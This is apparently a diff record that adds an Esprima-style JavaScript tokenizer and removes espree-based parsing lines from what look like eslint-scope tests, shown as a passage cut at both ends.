StringMap.prototype['delete'] = function (key) {<\n>+        key = '$' + key;<\n>+        return delete this.$data[key];<\n>+    };<\n>+    function isDecimalDigit(ch) {<\n>+        return (ch >= 48 && ch <= 57);   // 0..9<\n>+    }<\n>+    function isHexDigit(ch) {<\n>+        return '0123456789abcdefABCDEF'.indexOf(ch) >= 0;<\n>+    }<\n>+    function isOctalDigit(ch) {<\n>+        return '01234567'.indexOf(ch) >= 0;<\n>+    }<\n>+    // 7.2 White Space<\n>+    function isWhiteSpace(ch) {<\n>+        return (ch === 32) ||  // space<\n>+            (ch === 9) ||      // tab<\n>+            (ch === 0xB) ||<\n>+            (ch === 0xC) ||<\n>+            (ch === 0xA0) ||<\n>+            (ch >= 0x1680 && '\u1680\u180E\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200A\u202F\u205F\u3000\uFEFF'.indexOf(String.fromCharCode(ch)) > 0);<\n>+    }<\n>+    // 7.3 Line Terminators<\n>+    function isLineTerminator(ch) {<\n>+        return (ch === 10) || (ch === 13) || (ch === 0x2028) || (ch === 0x2029);<\n>+    }<\n>+    // 7.6 Identifier Names and Identifiers<\n>+    function isIdentifierStart(ch) {<\n>+        return (ch === 36) || (ch === 95) ||  // $ (dollar) and _ (underscore)<\n>+            (ch >= 65 && ch <= 90) ||         // A..Z<\n>+            (ch >= 97 && ch <= 122) ||        // a..z<\n>+            (ch === 92) ||                    // \ (backslash)<\n>+            ((ch >= 0x80) && Regex.NonAsciiIdentifierStart.test(String.fromCharCode(ch)));<\n>+    }<\n>+    function isIdentifierPart(ch) {<\n>+        return (ch === 36) || (ch === 95) ||  // $ (dollar) and _ (underscore)<\n>+            (ch >= 65 && ch <= 90) ||         // A..Z<\n>+            (ch >= 97 && ch <= 122) ||        // a..z<\n>+            (ch >= 48 && ch <= 57) ||         // 0..9<\n>+            (ch === 92) ||                    // \ (backslash)<\n>+            ((ch >= 0x80) && Regex.NonAsciiIdentifierPart.test(String.fromCharCode(ch)));<\n>+    }<\n>+    // 7.6.1.2 Future Reserved Words<\n>+    function isFutureReservedWord(id) {<\n>+        switch (id) {<\n>+        case 'class':<\n>+        case 'enum':<\n>+        case 'export':<\n>+        case 'extends':<\n>+        case 'import':<\n>+        case 'super':<\n>+            return true;<\n>+        default:<\n>+            return false;<\n>+        }<\n>+    }<\n>+    function isStrictModeReservedWord(id) {<\n>+        switch (id) {<\n>+        case 'implements':<\n>+        case 'interface':<\n>+        case 'package':<\n>+        case 'private':<\n>+        case 'protected':<\n>+        case 'public':<\n>+        case 'static':<\n>+        case 'yield':<\n>+        case 'let':<\n>+            return true;<\n>+        default:<\n>+            return false;<\n>+        }<\n>+    }<\n>+    function isRestrictedWord(id) {<\n>+        return id === 'eval' || id === 'arguments';<\n>+    }<\n>+    // 7.6.1.1 Keywords<\n>+    function isKeyword(id) {<\n>+        if (strict && isStrictModeReservedWord(id)) {<\n>+            return true;<\n>+        }<\n>+        // 'const' is specialized as Keyword in V8.<\n>+        // 'yield' is only treated as a keyword in strict mode.<\n>+        // 'let' is for compatiblity with SpiderMonkey and ES.next.<\n>+        // Some others are from future reserved words.<\n>+        switch (id.length) {<\n>+        case 2:<\n>+            return (id === 'if') || (id === 'in') || (id === 'do');<\n>+        case 3:<\n>+            return (id === 'var') || (id === 'for') || (id === 'new') ||<\n>+                (id === 'try') || (id === 'let');<\n>+        case 4:<\n>+            return (id === 'this') || (id === 'else') || (id === 'case') ||<\n>+                (id === 'void') || (id === 'with') || (id === 'enum');<\n>+        case 5:<\n>+            return (id === 'while') || (id === 'break') || (id === 'catch') ||<\n>+                (id === 'throw') || (id === 'const') ||<\n>+                (id === 'class') || (id === 'super');<\n>+        case 6:<\n>+            return (id === 'return') || (id === 'typeof') || (id === 'delete') ||<\n>+                (id === 'switch') || (id === 'export') || (id === 'import');<\n>+        case 7:<\n>+            return (id === 'default') || (id === 'finally') || (id === 'extends');<\n>+        case 8:<\n>+            return (id === 'function') || (id === 'continue') || (id === 'debugger');<\n>+        case 10:<\n>+            return (id === 'instanceof');<\n>+        default:<\n>+            return false;<\n>+        }<\n>+    }<\n>+    // 7.4 Comments<\n>+    function skipComment() {<\n>+        var ch<c> blockComment<c> lineComment;<\n>+        blockComment = false;<\n>+        lineComment = false;<\n>+        while (index < length) {<\n>+            ch = source.charCodeAt(index);<\n>+            if (lineComment) {<\n>+                ++index;<\n>+                if (isLineTerminator(ch)) {<\n>+                    lineComment = false;<\n>+                    if (ch === 13 && source.charCodeAt(index) === 10) {<\n>+                        ++index;<\n>+                    }<\n>+                    ++lineNumber;<\n>+                    lineStart = index;<\n>+                }<\n>+            } else if (blockComment) {<\n>+                if (isLineTerminator(ch)) {<\n>+                    if (ch === 13 && source.charCodeAt(index + 1) === 10) {<\n>+                        ++index;<\n>+                    }<\n>+                    ++lineNumber;<\n>+                    ++index;<\n>+                    lineStart = index;<\n>+                    if (index >= length) {<\n>+                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                    }<\n>+                } else {<\n>+                    ch = source.charCodeAt(index++);<\n>+                    if (index >= length) {<\n>+                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                    }<\n>+                    // Block comment ends with '*/' (char #42<c> char #47).<\n>+                    if (ch === 42) {<\n>+                        ch = source.charCodeAt(index);<\n>+                        if (ch === 47) {<\n>+                            ++index;<\n>+                            blockComment = false;<\n>+                        }<\n>+                    }<\n>+                }<\n>+            } else if (ch === 47) {<\n>+                ch = source.charCodeAt(index + 1);<\n>+                // Line comment starts with '//' (char #47<c> char #47).<\n>+                if (ch === 47) {<\n>+                    index += 2;<\n>+                    lineComment = true;<\n>+                } else if (ch === 42) {<\n>+                    // Block comment starts with '/*' (char #47<c> char #42).<\n>+                    index += 2;<\n>+                    blockComment = true;<\n>+                    if (index >= length) {<\n>+                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                    }<\n>+                } else {<\n>+                    break;<\n>+                }<\n>+            } else if (isWhiteSpace(ch)) {<\n>+                ++index;<\n>+            } else if (isLineTerminator(ch)) {<\n>+                ++index;<\n>+                if (ch === 13 && source.charCodeAt(index) === 10) {<\n>+                    ++index;<\n>+                }<\n>+                ++lineNumber;<\n>+                lineStart = index;<\n>+            } else {<\n>+                break;<\n>+            }<\n>+        }<\n>+    }<\n>+    function scanHexEscape(prefix) {<\n>+        var i<c> len<c> ch<c> code = 0;<\n>+        len = (prefix === 'u') ? 4 : 2;<\n>+        for (i = 0; i < len; ++i) {<\n>+            if (index < length && isHexDigit(source[index])) {<\n>+                ch = source[index++];<\n>+                code = code * 16 + '0123456789abcdef'.indexOf(ch.toLowerCase());<\n>+            } else {<\n>+                return '';<\n>+            }<\n>+        }<\n>+        return String.fromCharCode(code);<\n>+    }<\n>+    function scanUnicodeCodePointEscape() {<\n>+        var ch<c> code<c> cu1<c> cu2;<\n>+        ch = source[index];<\n>+        code = 0;<\n>+        // At least<c> one hex digit is required.<\n>+        if (ch === '}') {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        while (index < length) {<\n>+            ch = source[index++];<\n>+            if (!isHexDigit(ch)) {<\n>+                break;<\n>+            }<\n>+            code = code * 16 + '0123456789abcdef'.indexOf(ch.toLowerCase());<\n>+        }<\n>+        if (code > 0x10FFFF || ch !== '}') {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        // UTF-16 Encoding<\n>+        if (code <= 0xFFFF) {<\n>+            return String.fromCharCode(code);<\n>+        }<\n>+        cu1 = ((code - 0x10000) >> 10) + 0xD800;<\n>+        cu2 = ((code - 0x10000) & 1023) + 0xDC00;<\n>+        return String.fromCharCode(cu1<c> cu2);<\n>+    }<\n>+    function getEscapedIdentifier() {<\n>+        var ch<c> id;<\n>+        ch = source.charCodeAt(index++);<\n>+        id = String.fromCharCode(ch);<\n>+        // '\u' (char #92<c> char #117) denotes an escaped character.<\n>+        if (ch === 92) {<\n>+            if (source.charCodeAt(index) !== 117) {<\n>+                throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+            }<\n>+            ++index;<\n>+            ch = scanHexEscape('u');<\n>+            if (!ch || ch === '\\' || !isIdentifierStart(ch.charCodeAt(0))) {<\n>+                throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+            }<\n>+            id = ch;<\n>+        }<\n>+        while (index < length) {<\n>+            ch = source.charCodeAt(index);<\n>+            if (!isIdentifierPart(ch)) {<\n>+                break;<\n>+            }<\n>+            ++index;<\n>+            id += String.fromCharCode(ch);<\n>+            // '\u' (char #92<c> char #117) denotes an escaped character.<\n>+            if (ch === 92) {<\n>+                id = id.substr(0<c> id.length - 1);<\n>+                if (source.charCodeAt(index) !== 117) {<\n>+                    throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                }<\n>+                ++index;<\n>+                ch = scanHexEscape('u');<\n>+                if (!ch || ch === '\\' || !isIdentifierPart(ch.charCodeAt(0))) {<\n>+                    throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                }<\n>+                id += ch;<\n>+            }<\n>+        }<\n>+        return id;<\n>+    }<\n>+    function getIdentifier() {<\n>+        var start<c> ch;<\n>+        start = index++;<\n>+        while (index < length) {<\n>+            ch = source.charCodeAt(index);<\n>+            if (ch === 92) {<\n>+                // Blackslash (char #92) marks Unicode escape sequence.<\n>+                index = start;<\n>+                return getEscapedIdentifier();<\n>+            }<\n>+            if (isIdentifierPart(ch)) {<\n>+                ++index;<\n>+            } else {<\n>+                break;<\n>+            }<\n>+        }<\n>+        return source.slice(start<c> index);<\n>+    }<\n>+    function scanIdentifier() {<\n>+        var start<c> id<c> type;<\n>+        start = index;<\n>+        // Backslash (char #92) starts an escaped character.<\n>+        id = (source.charCodeAt(index) === 92) ? getEscapedIdentifier() : getIdentifier();<\n>+        // There is no keyword or literal with only one character.<\n>+        // Thus<c> it must be an identifier.<\n>+        if (id.length === 1) {<\n>+            type = Token.Identifier;<\n>+        } else if (isKeyword(id)) {<\n>+            type = Token.Keyword;<\n>+        } else if (id === 'null') {<\n>+            type = Token.NullLiteral;<\n>+        } else if (id === 'true' || id === 'false') {<\n>+            type = Token.BooleanLiteral;<\n>+        } else {<\n>+            type = Token.Identifier;<\n>+        }<\n>+        return {<\n>+            type: type<c><\n>+            value: id<c><\n>+            lineNumber: lineNumber<c><\n>+            lineStart: lineStart<c><\n>+            range: [start<c> index]<\n>+        };<\n>+    }<\n>+    // 7.7 Punctuators<\n>+    function scanPunctuator() {<\n>+        var start = index<c><\n>+            code = source.charCodeAt(index)<c><\n>+            code2<c><\n>+            ch1 = source[index]<c><\n>+            ch2<c><\n>+            ch3<c><\n>+            ch4;<\n>+        switch (code) {<\n>+        // Check for most common single-character punctuators.<\n>+        case 40:   // ( open bracket<\n>+        case 41:   // ) close bracket<\n>+        case 59:   // ; semicolon<\n>+        case 44:   // <c> comma<\n>+        case 123:  // { open curly brace<\n>+        case 125:  // } close curly brace<\n>+        case 91:   // [<\n>+        case 93:   // ]<\n>+        case 58:   // :<\n>+        case 63:   // ?<\n>+        case 126:  // ~<\n>+            ++index;<\n>+            if (extra.tokenize) {<\n>+                if (code === 40) {<\n>+                    extra.openParenToken = extra.tokens.length;<\n>+                } else if (code === 123) {<\n>+                    extra.openCurlyToken = extra.tokens.length;<\n>+                }<\n>+            }<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: String.fromCharCode(code)<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        default:<\n>+            code2 = source.charCodeAt(index + 1);<\n>+            // '=' (char #61) marks an assignment or comparison operator.<\n>+            if (code2 === 61) {<\n>+                switch (code) {<\n>+                case 37:  // %<\n>+                case 38:  // &<\n>+                case 42:  // *:<\n>+                case 43:  // +<\n>+                case 45:  // -<\n>+                case 47:  // /<\n>+                case 60:  // <<\n>+                case 62:  // ><\n>+                case 94:  // ^<\n>+                case 124: // |<\n>+                    index += 2;<\n>+                    return {<\n>+                        type: Token.Punctuator<c><\n>+                        value: String.fromCharCode(code) + String.fromCharCode(code2)<c><\n>+                        lineNumber: lineNumber<c><\n>+                        lineStart: lineStart<c><\n>+                        range: [start<c> index]<\n>+                    };<\n>+                case 33: // !<\n>+                case 61: // =<\n>+                    index += 2;<\n>+                    // !== and ===<\n>+                    if (source.charCodeAt(index) === 61) {<\n>+                        ++index;<\n>+                    }<\n>+                    return {<\n>+                        type: Token.Punctuator<c><\n>+                        value: source.slice(start<c> index)<c><\n>+                        lineNumber: lineNumber<c><\n>+                        lineStart: lineStart<c><\n>+                        range: [start<c> index]<\n>+                    };<\n>+                default:<\n>+                    break;<\n>+                }<\n>+            }<\n>+            break;<\n>+        }<\n>+        // Peek more characters.<\n>+        ch2 = source[index + 1];<\n>+        ch3 = source[index + 2];<\n>+        ch4 = source[index + 3];<\n>+        // 4-character punctuator: >>>=<\n>+        if (ch1 === '>' && ch2 === '>' && ch3 === '>') {<\n>+            if (ch4 === '=') {<\n>+                index += 4;<\n>+                return {<\n>+                    type: Token.Punctuator<c><\n>+                    value: '>>>='<c><\n>+                    lineNumber: lineNumber<c><\n>+                    lineStart: lineStart<c><\n>+                    range: [start<c> index]<\n>+                };<\n>+            }<\n>+        }<\n>+        // 3-character punctuators: === !== >>> <<= >>=<\n>+        if (ch1 === '>' && ch2 === '>' && ch3 === '>') {<\n>+            index += 3;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: '>>>'<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        if (ch1 === '<' && ch2 === '<' && ch3 === '=') {<\n>+            index += 3;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: '<<='<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        if (ch1 === '>' && ch2 === '>' && ch3 === '=') {<\n>+            index += 3;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: '>>='<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        if (ch1 === '.' && ch2 === '.' && ch3 === '.') {<\n>+            index += 3;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: '...'<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        // Other 2-character punctuators: ++ -- << >> && ||<\n>+        if (ch1 === ch2 && ('+-<>&|'.indexOf(ch1) >= 0)) {<\n>+            index += 2;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: ch1 + ch2<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        if (ch1 === '=' && ch2 === '>') {<\n>+            index += 2;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: '=>'<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        if ('<>=!+-*%&|^/'.indexOf(ch1) >= 0) {<\n>+            ++index;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: ch1<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        if (ch1 === '.') {<\n>+            ++index;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: ch1<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+    }<\n>+    // 7.8.3 Numeric Literals<\n>+    function scanHexLiteral(start) {<\n>+        var number = '';<\n>+        while (index < length) {<\n>+            if (!isHexDigit(source[index])) {<\n>+                break;<\n>+            }<\n>+            number += source[index++];<\n>+        }<\n>+        if (number.length === 0) {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        if (isIdentifierStart(source.charCodeAt(index))) {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        return {<\n>+            type: Token.NumericLiteral<c><\n>+            value: parseInt('0x' + number<c> 16)<c><\n>+            lineNumber: lineNumber<c><\n>+            lineStart: lineStart<c><\n>+            range: [start<c> index]<\n>+        };<\n>+    }<\n>+    function scanOctalLiteral(prefix<c> start) {<\n>+        var number<c> octal;<\n>+        if (isOctalDigit(prefix)) {<\n>+            octal = true;<\n>+            number = '0' + source[index++];<\n>+        } else {<\n>+            octal = false;<\n>+            ++index;<\n>+            number = '';<\n>+        }<\n>+        while (index < length) {<\n>+            if (!isOctalDigit(source[index])) {<\n>+                break;<\n>+            }<\n>+            number += source[index++];<\n>+        }<\n>+        if (!octal && number.length === 0) {<\n>+            // only 0o or 0O<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        if (isIdentifierStart(source.charCodeAt(index)) || isDecimalDigit(source.charCodeAt(index))) {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        return {<\n>+            type: Token.NumericLiteral<c><\n>+            value: parseInt(number<c> 8)<c><\n>+            octal: octal<c><\n>+            lineNumber: lineNumber<c><\n>+            lineStart: lineStart<c><\n>+            range: [start<c> index]<\n>+        };<\n>+    }<\n>+    function scanNumericLiteral() {<\n>+        var number<c> start<c> ch<c> octal;<\n>+        ch = source[index];<\n>+        assert(isDecimalDigit(ch.charCodeAt(0)) || (ch === '.')<c><\n>+            'Numeric literal must start with a decimal digit or a decimal point');<\n>+        start = index;<\n>+        number = '';<\n>+        if (ch !== '.') {<\n>+            number = source[index++];<\n>+            ch = source[index];<\n>+            // Hex number starts with '0x'.<\n>+            // Octal number starts with '0'.<\n>+            // Octal number in ES6 starts with '0o'.<\n>+            // Binary number in ES6 starts with '0b'.<\n>+            if (number === '0') {<\n>+                if (ch === 'x' || ch === 'X') {<\n>+                    ++index;<\n>+                    return scanHexLiteral(start);<\n>+                }<\n>+                if (ch === 'b' || ch === 'B') {<\n>+                    ++index;<\n>+                    number = '';<\n>+                    while (index < length) {<\n>+                        ch = source[index];<\n>+                        if (ch !== '0' && ch !== '1') {<\n>+                            break;<\n>+                        }<\n>+                        number += source[index++];<\n>+                    }<\n>+                    if (number.length === 0) {<\n>+                        // only 0b or 0B<\n>+                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                    }<\n>+                    if (index < length) {<\n>+                        ch = source.charCodeAt(index);<\n>+                        /* istanbul ignore else */<\n>+                        if (isIdentifierStart(ch) || isDecimalDigit(ch)) {<\n>+                            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                        }<\n>+                    }<\n>+                    return {<\n>+                        type: Token.NumericLiteral<c><\n>+                        value: parseInt(number<c> 2)<c><\n>+                        lineNumber: lineNumber<c><\n>+                        lineStart: lineStart<c><\n>+                        range: [start<c> index]<\n>+                    };<\n>+                }<\n>+                if (ch === 'o' || ch === 'O' || isOctalDigit(ch)) {<\n>+                    return scanOctalLiteral(ch<c> start);<\n>+                }<\n>+                // decimal number starts with '0' such as '09' is illegal.<\n>+                if (ch && isDecimalDigit(ch.charCodeAt(0))) {<\n>+                    throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                }<\n>+            }<\n>+            while (isDecimalDigit(source.charCodeAt(index))) {<\n>+                number += source[index++];<\n>+            }<\n>+            ch = source[index];<\n>+        }<\n>+        if (ch === '.') {<\n>+            number += source[index++];<\n>+            while (isDecimalDigit(source.charCodeAt(index))) {<\n>+                number += source[index++];<\n>+            }<\n>+            ch = source[index];<\n>+        }<\n>+        if (ch === 'e' || ch === 'E') {<\n>+            number += source[index++];<\n>+            ch = source[index];<\n>+            if (ch === '+' || ch === '-') {<\n>+                number += source[index++];<\n>+            }<\n>+            if (isDecimalDigit(source.charCodeAt(index))) {<\n>+                while (isDecimalDigit(source.charCodeAt(index))) {<\n>+                    number += source[index++];<\n>+                }<\n>+            } else {<\n>+                throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+            }<\n>+        }<\n>+        if (isIdentifierStart(source.charCodeAt(index))) {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        return {<\n>+            type: Token.NumericLiteral<c><\n>+            value: parseFloat(number)<c><\n>+            lineNumber: lineNumber<c><\n>+            lineStart: lineStart<c><\n>+            range: [start<c> index]<\n>+        };<\n>+    }<\n>+    // 7.8.4 String Literals<\n>+    function scanStringLiteral() {<\n>+        var str = ''<c> quote<c> start<c> ch<c> code<c> unescaped<c> restore<c> octal = false;<\n>+        quote = source[index];<\n>+        assert((quote === '\'' || quote === '""')<c><\n>+            'String literal must starts with a quote');<\n>+        start = index;<\n>+        ++index;<\n>+        while (index < length) {<\n>+            ch = source[index++];<\n>+            if (ch === quote) {<\n>+                quote = '';<\n>+                break;<\n>+            } else if (ch === '\\') {<\n>+                ch = source[index++];<\n>+                if (!ch || !isLineTerminator(ch.charCodeAt(0))) {<\n>+                    switch (ch) {<\n>+                    case 'n':<\n>+                        str += '\n';<\n>+                        break;<\n>+                    case 'r':<\n>+                        str += '\r';<\n>+                        break;<\n>+                    case 't':<\n>+                        str += '\t';<\n>+                        break;<\n>+                    case 'u':<\n>+                    case 'x':<\n>+                        if (source[index] === '{') {<\n>+                            ++index;<\n>+                            str += scanUnicodeCodePointEscape();<\n>+                        } else {<\n>+                            restore = index;<\n>+                            unescaped = scanHexEscape(ch);<\n>+                            if (unescaped) {<\n>+                                str += unescaped;<\n>+                            } else {<\n>+                                index = restore;<\n>+                                str += ch;<\n>+                            }<\n>+                        }<\n>+                        break;<\n>+                    case 'b':<\n>+                        str += '\b';<\n>+                        break;<\n>+                    case 'f':<\n>+                        str += '\f';<\n>+                        break;<\n>+                    case 'v':<\n>+                        str += '\x0B';<\n>+                        break;<\n>+                    default:<\n>+                        if (isOctalDigit(ch)) {<\n>+                            code = '01234567'.indexOf(ch);<\n>+                            // \0 is not octal escape sequence<\n>+                            if (code !== 0) {<\n>+                                octal = true;<\n>+                            }<\n>+                            /* istanbul ignore else */<\n>+                            if (index < length && isOctalDigit(source[index])) {<\n>+                                octal = true;<\n>+                                code = code * 8 + '01234567'.indexOf(source[index++]);<\n>+                                // 3 digits are only allowed when string starts<\n>+                                // with 0<c> 1<c> 2<c> 3<\n>+                                if ('0123'.indexOf(ch) >= 0 &&<\n>+                                        index < length &&<\n>+                                        isOctalDigit(source[index])) {<\n>+                                    code = code * 8 + '01234567'.indexOf(source[index++]);<\n>+                                }<\n>+                            }<\n>+                            str += String.fromCharCode(code);<\n>+                        } else {<\n>+                            str += ch;<\n>+                        }<\n>+                        break;<\n>+                    }<\n>+                } else {<\n>+                    ++lineNumber;<\n>+                    if (ch ===  '\r' && source[index] === '\n') {<\n>+                        ++index;<\n>+                    }<\n>+                    lineStart = index;<\n>+                }<\n>+            } else if (isLineTerminator(ch.charCodeAt(0))) {<\n>+                break;<\n>+            } else {<\n>+                str += ch;<\n>+            }<\n>+        }<\n>+        if (quote !== '') {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        return {<\n>+            type: Token.StringLiteral<c><\n>+            value: str<c><\n>+            octal: octal<c><\n>+            lineNumber: lineNumber<c><\n>+            lineStart: lineStart<c><\n>+            range: [start<c> index]<\n>+        };<\n>+    }<\n>+    function scanTemplate() {<\n>+        var cooked = ''<c> ch<c> start<c> terminated<c> tail<c> restore<c> unescaped<c> code<c> octal;<\n>+        terminated = false;<\n>+        tail = false;<\n>+        start = index;<\n>+        ++index;<\n>+        while (index < length) {<\n>+            ch = source[index++];<\n>+            if (ch === '`') {<\n>+                tail = true;<\n>+                terminated = true;","-    TEST_FILES = ""test/*.js"";<\n>-var espree = require('espree');<\n>-var ast = espree.parse(code);<\n>-         * @member {espree.Identifier} Definition#name - the identifier AST node of the occurrence.<\n>-         * @member {espree.Node} Definition#node - the enclosing node of the identifier.<\n>-         * @member {espree.Node?} Definition#parent - the enclosing statement node of the identifier.<\n>- * Mozilla Parser API</a>. E.g. <a href=""https://github.com/eslint/espree"">espree</a> is a parser<\n>- * Main interface function. Takes an Espree syntax tree and returns the<\n>- * @param {espree.Tree} tree - Abstract Syntax Tree<\n>-    // But espree 2.0 parses to ArrayExpression<c> ObjectExpression<c> etc...<\n>-         * @member {espreeIdentifier} Reference#identifier<\n>-             * @member {espreeNode} Reference#writeExpr<\n>-     * @param {Espree.Node} node - a node to get.<\n>-     * @param {Espree.Node} node - node for the acquired scope.<\n>-     * @param {Espree.Node} node - node for the acquired scope.<\n>-     * @param {Espree.Node} node - releasing node.<\n>-         * @member {espree.Node} Scope#block<\n>-     * @param {Espree.Identifier} ident - identifier to be resolved.<\n>-         * @member {espree.Identifier[]} Variable#identifiers<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-        const ast = espree(""var arrow = (a<c> b<c> c<c> d) => {}"");<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-        expect(scope.variables).to.have.length(4);<\n>-        expect(scope.variables[0].name).to.be.equal(""a"");<\n>-        expect(scope.variables[1].name).to.be.equal(""b"");<\n>-        expect(scope.variables[2].name).to.be.equal(""c"");<\n>-        expect(scope.variables[3].name).to.be.equal(""d"");<\n>-        expect(scope.references).to.have.length(0);<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        let ast = espree(`<\n>-        ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        let ast = espree(`<\n>-        ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        expect(scope.variables[3].defs[0].rest).to.be.true;<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(""export var v;"");<\n>-        const ast = espree(""export default function f(){};"");<\n>-        const ast = espree(""export default function(){};"");<\n>-        const ast = espree(""export default 42;"");<\n>-        const ast = espree(""export {x};"");<\n>-        const ast = espree(""export {v as x};"");<\n>-        const ast = espree(""export {x} from \""mod\"";"");<\n>-        const ast = espree(""export {v as x} from \""mod\"";"");<\n>-        const ast = espree(""export * from \""mod\"";"");<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(""import v from \""mod\"";"");<\n>-        const ast = espree(""import * as ns from \""mod\"";"");<\n>-        const ast = espree(""import {x} from \""mod\"";"");<\n>-        const ast = espree(""import {x as v} from \""mod\"";"");<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-    it(""materialize rest argument in scope""<c> function() {<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        analyze(ast); // default is `fallback: ""iteration""`<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-    /* eslint-disable require-jsdoc */<\n>-            [""A""<c> ""A""]<c> // outer scope""s and inner scope""s.<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(""b++;"");<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-    it(""assignment doesn\'t leak""<c> function() {<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-    it(""for-in-statement doesn\'t leaks""<c> function() {<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-                    ""use strict"";<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-            function foo() {}`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(""function bar() { q: for(;;) 